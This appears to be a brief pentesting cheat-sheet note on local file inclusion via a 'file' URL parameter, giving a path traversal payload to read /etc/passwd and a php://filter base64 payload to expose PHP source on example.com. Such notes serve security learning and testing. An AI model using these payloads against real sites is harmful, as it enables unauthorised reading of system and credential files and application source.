Depending on how the site is set up, you may be able to navigate through the file system
`http://example.com/?file=filename.php`
This could be vulnerable, try finding the passwd file
`http://example.com/?file=../../../../etc/passwd`

You may be able to see the base64 code by adding php://filter/convert.base64-encode/resource= e.g.
`http://example.com/?file=php://filter/convert.base64-encode/resource=filename.php`

